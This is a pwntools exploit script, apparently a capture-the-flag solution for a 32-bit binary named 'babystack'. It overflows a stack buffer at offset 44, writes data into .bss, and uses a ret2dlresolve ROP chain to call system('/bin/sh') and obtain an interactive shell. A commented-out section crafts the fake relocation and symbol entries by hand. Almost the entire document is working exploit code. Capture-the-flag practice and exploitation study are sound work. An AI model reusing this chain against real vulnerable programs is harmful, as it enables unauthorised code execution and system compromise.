from pwn import *

CONN = "nc localhost 8000".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# ===========================================================
#                    WRAPPER FUNCTION
# ===========================================================

def sl(x): io.sendline(x)
def sla(x, y): io.sendlineafter(x, y)
def se(x): io.send(x)
def sa(x, y): io.sendafter(x, y)
def ru(x, drop=False): return io.recvuntil(x, drop=drop)
def rl(): return io.recvline()
def cl(): io.clean()
def un64(x): return u64(x.ljust(8, b'\x00'))
def leak(name, addr): info(f"{name} @ {hex(addr)}")

# ===========================================================
#                           SETUP
# ===========================================================

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
c
)
""".format(
    **locals()
)

# Binary filename
exe = "./babystack"

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)

# Change logging level to help with debugging (error/warning/info/debug)
# context.terminal = "tmux splitw -a".split(" ")
context.log_level = "info"

# Lib-C library, can use pwninit/patchelf to patch binary
libc = elf.libc
# ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

if args.REMOTE:
    pass
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    # ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Functions
main = 0x8048457
bss = 0x804a020
dynstr = 0x804822c
dynsym = 0x80481cc
relplt = 0x80482b0
scanInput = (0x804843b)
dlresolve = (0x80482f0)

offset = 44
read_size = 0x100,
payload = flat({
    offset: [
        elf.sym['read'],
        scanInput,
        0,
        elf.bss(),
        read_size,
    ]
})

se(payload)

# =======  Normal way without using ret2dlresolve
#dynsym_offset = ((bss + 0xc) - dynsym) // 0x10
#r_info = (dynsym_offset << 8) | 0x7
#
#dynstr_index = (bss + 28) - dynstr
#print(hex(dynsym_offset), hex(r_info), hex(dynstr_index))
#
#paylaod1 = b""
#
## Our .rel.plt entry
#paylaod1 += p32(elf.got['alarm'])
#paylaod1 += p32(r_info)
#
## Empty
#paylaod1 += p32(0x0)
#
## Our dynsm entry
#paylaod1 += p32(dynstr_index)
#paylaod1 += p32(0xde)*3
#
## Our dynstr entry
#paylaod1 += b"system\x00"
#
## Store "/bin/sh" here so we can have a pointer ot it
#paylaod1 += b"/bin/sh\x00"
#
#se(paylaod1)
#binsh_bss_address = bss + 35
#ret_plt_offset = bss - relplt
#
#sleep(1)
#
#offset2 = 44
#payload2 = flat({
#    offset2: [
#       # dlresolve,
#       # ret_plt_offset,
#       # 0xdeadbeef,
#       # binsh_bss_address
#        rop.chain()
#    ]
#})
#
#se(payload2)
ret2dlresolve = Ret2dlresolvePayload(elf, 'system', ["/bin/sh"], data_addr=bss)
rop.ret2dlresolve(ret2dlresolve)
se(ret2dlresolve.payload)


offset2 = 44
payload2 = flat({
    offset2: [
        rop.chain()
    ]
})

se(payload2)

# Got Shell?
io.interactive()
